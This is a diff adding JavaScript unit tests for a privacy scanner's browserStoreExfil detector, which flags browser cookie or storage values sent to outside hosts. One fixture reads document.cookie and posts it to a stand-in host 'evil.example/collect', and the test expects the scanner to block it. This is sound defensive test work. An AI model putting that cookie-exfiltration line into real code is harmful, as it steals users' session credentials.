@@ -3,6 +3,7 @@ import assert from 'node:assert/strict';
 import {
   analyzeDependencies,
   analyzePackageManifest,
+  browserStoreExfil,
   classifyRiskLevel,
   composeVerdict,
   extractExternalHosts,
@@ -208,6 +209,49 @@ test('开发/测试脚本中的凭据类 critical 降级为 warning', () => {
   // 普通代码文件不受影响，仍为 critical。
   const notesProd = privacyFindings(text, { file: 'src/gateway.ts' });
   assert.ok(notesProd.some((n) => n.severity === 'critical'));
+});
+
+test('browserStoreExfil: localStorage 存 UI 状态 + 相对路径 fetch 不算外发', () => {
+  const text =
+    "const token = localStorage.getItem('theme');\n" +
+    "fetch('/api/theme', { method: 'POST', body: JSON.stringify({ theme: token }) })";
+  assert.equal(browserStoreExfil(text), null, '相对路径 fetch 不应判定为外发');
+  const notes = privacyFindings(text, { file: 'client.js' });
+  assert.ok(!notes.some((n) => n.severity === 'critical'), '正常客户端操作不构成 critical');
+  assert.ok(notes.some((n) => n.severity === 'warning' && /浏览器 Cookie/.test(n.explanation)));
+});
+
+test('browserStoreExfil: cookie 值发往外部域名判定为真外发并 blocked', () => {
+  const text =
+    'const cred = document.cookie;\n' +
+    "fetch('https://evil.example/collect', { body: cred })";
+  const ex = browserStoreExfil(text);
+  assert.ok(ex && ex.vars.includes('cred'), 'cred 进入外部请求应判定为外发');
+  const notes = privacyFindings(text, { file: 'client.js' });
+  assert.ok(notes.some((n) => n.severity === 'critical' && /浏览器 Cookie/.test(n.explanation)));
+  assert.equal(composeVerdict({ findings: [], privacyNotes: notes }).verdict, 'blocked');
+});
+
+test('browserStoreExfil: 读取存储但值未进入请求仍为灰区 warning', () => {
+  const text =
+    "const theme = localStorage.getItem('theme');\n" +
+    "fetch('https://api.analytics.io/ping')";
+  assert.equal(browserStoreExfil(text), null);
+  const notes = privacyFindings(text, { file: 'client.js' });
+  assert.ok(notes.some((n) => n.severity === 'warning' && /浏览器 Cookie/.test(n.explanation)));
+  assert.ok(!notes.some((n) => n.severity === 'critical'));
+});
+
+test('privacyFindings 的 note 带位置留痕（file:line）', () => {
+  const text =
+    "const theme = localStorage.getItem('theme');\n" +
+    "fetch('https://api.analytics.io/ping')";
+  const notes = privacyFindings(text, { file: 'client.ts' });
+  const warn = notes.find((n) => /浏览器 Cookie/.test(n.explanation));
+  assert.ok(warn, '应产生浏览器存储 note');
+  assert.ok(Number(warn.line) > 0, 'note 应带行号');
+  assert.ok(warn.snippet && warn.snippet.includes('localStorage'), 'note 应带 snippet');
+  assert.equal(warn.file, 'client.ts');
 });
 
 test('DSH_HOME 等 DSH_ 配置/路径变量不算凭据，即使同文件有网络发送', () => {
